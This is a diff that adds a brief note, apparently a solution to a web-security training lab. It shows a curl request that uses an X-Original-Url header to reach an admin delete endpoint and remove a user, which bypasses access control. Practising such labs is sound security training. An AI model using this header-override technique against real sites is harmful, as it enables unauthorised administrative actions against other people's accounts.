@@ -1,0 +1,9 @@
+
+
+add this headers:
+	X-Original-Url: /admin/delete
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0ad500020477697081a38aea009c00be.web-security-academy.net' -H $'X-Original-Url: /admin/delete' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0ad500020477697081a38aea009c00be.web-security-academy.net/login' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=pwVYMJQOU10y62kWfpM8EhnLjCqgTgXC' \
+    $'https://0ad500020477697081a38aea009c00be.web-security-academy.net/?username=carlos'
